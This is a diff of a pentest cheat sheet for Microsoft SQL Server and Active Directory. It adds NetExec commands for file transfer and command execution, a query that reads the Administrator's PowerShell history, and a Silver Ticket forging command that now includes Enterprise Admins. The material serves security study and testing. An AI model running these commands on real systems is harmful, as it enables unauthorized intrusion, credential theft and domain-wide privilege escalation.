@@ -41,20 +41,28 @@ enum_users
 # check linked servers
 enum_links
 
+# Version Extraction
+SELECT @@VERSION;
+
 # Enum Domain Name and Server Name
 SELECT Default_domain();
 SELECT @@SERVERNAME;
+
+# Run standalone Queries
+nxc mssql $ip -u '' -p '' --query "SELECT name FROM sys.databases"
 
 # Sid
 SELECT SUSER_SID('Username')
 select SUSER_SNAME(SID_BINARY(N'Put Raw SID Here'))
 
 >>> python3
->>> from impacket.dcerpc.v5.dtypes import SID
->>> raw_sid = 'Put Raw SID'
->>> admin = SID(bytes.formhex(raw_sid))
->>> admin.formatCanonical()
+from impacket.dcerpc.v5.dtypes import SID
+raw_sid = 'Put Raw SID'
+admin = SID(bytes.formhex(raw_sid))
+admin.formatCanonical()
 ```
+
+
 ### Database usage 
 ```bash
 enum_db                         #show databases
@@ -78,12 +86,11 @@ RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 ```
 
-## Common Check's
+## NetExec
 ### Rid-Brute 
 ```bash
 nxc mssql $ip -u '$user' -p '$pass' --rid-brute 2000 # max
 ```
-
 ### Logged in users:
 ```bash
 nxc mssql $ip -u '$user' -p '$pass' --local-auth -M enum_logins
@@ -96,18 +103,40 @@ nxc mssql $ip -u '$user' -p '$pass' --local-auth -M enum_impersonate
 ```bash
 nxc mssql $ip -u '$user' -p 'pass' --local-auth -M mssql_priv
 ```
+### Upload and Download Files
+```bash
+nxc mssql $ip -u '' -p ''  --put-file <local_file> <remote_path>
+nxc mssql $ip -u '' -p ''  --get-file <local_output> <remote_file>
+```
+### Run Query
+```bash
+nxc mssql $ip -u '' -p '' -q "select @@VERSION"
+nxc mssql $ip -u '' -p '' --query "SELECT name FROM sys.databases"
+```
+#### Extract Powershell History
+```bash
+nxc mssql $ip -u '' -p '' --query "SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS x;"
+
+SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS x;
+```
+### Command Execution
+```bash
+nxc mssql $ip -u '' -p '' -x "whoami"
+nxc mssql $ip -u '' -p '' -x "powershell -c Get-Host"
+```
+
 # Reading
-##  Reading  $SID
+##  Read  $SID
 ```bash
  EXEC xp_cmdshell 'whoami';
 
  SELECT SUSER_SID('use_name'); 
  ```
-## Reading  files
+## Read  files
 ```bash
 SELECT * FROM OPENROWSET(BULK 'C:\Windows\system32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;
 ```
-# Writing
+# Write
 ## Writing files
 
 [More ways to write file](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql)
@@ -228,9 +257,27 @@ exec xp_cmdshell 'powershell -enc <encoded_raw_code>'
 
 <img width="800" height="400" alt="image" src="assets/img/posts/Screenshot 2026-02-07 232402.png" />
 
+> A Silver Ticket is a forged Kerberos TGS (Ticket Granting Service) ticket. Unlike Golden Tickets which forge TGT (Ticket Granting Tickets), Silver Tickets target specific services.
+> 
+> How Kerberos normally works:
+- User authenticates to DC, receives TGT
+- User presents TGT to DC to request service ticket (TGS)
+- DC validates TGT and issues TGS for requested service
+- User presents TGS to service
+- Service validates TGS and grants access
+> How Silver Ticket attack works:
+- Attacker has service account password hash
+- Attacker forges TGS ticket locally without contacting DC
+- Attacker includes arbitrary group memberships in the ticket
+- Service validates ticket using its own hash (not by contacting DC)
+- Service grants access based on forged group memberships
+
+> 
 ```bash
-ticketer.py -nthash $nthash -domain-sid $Domain_SID -domain $Domain -spn $user/$Full_DOmain:$Port -groups 512,513 -user-id 500 Administrator
+ticketer.py -nthash $nthash -domain-sid $Domain_SID -domain $Domain -spn $user/$Full_DOmain:$Port -groups 512,513,519 -user-id 500 Administrator
 ```
+
+- 512 [Domain Admins Group], 513 [Domain users Group], 519 [Enterprise Admins (forest-level privileges)]
 
 ### Get Groups SID
 ```bash
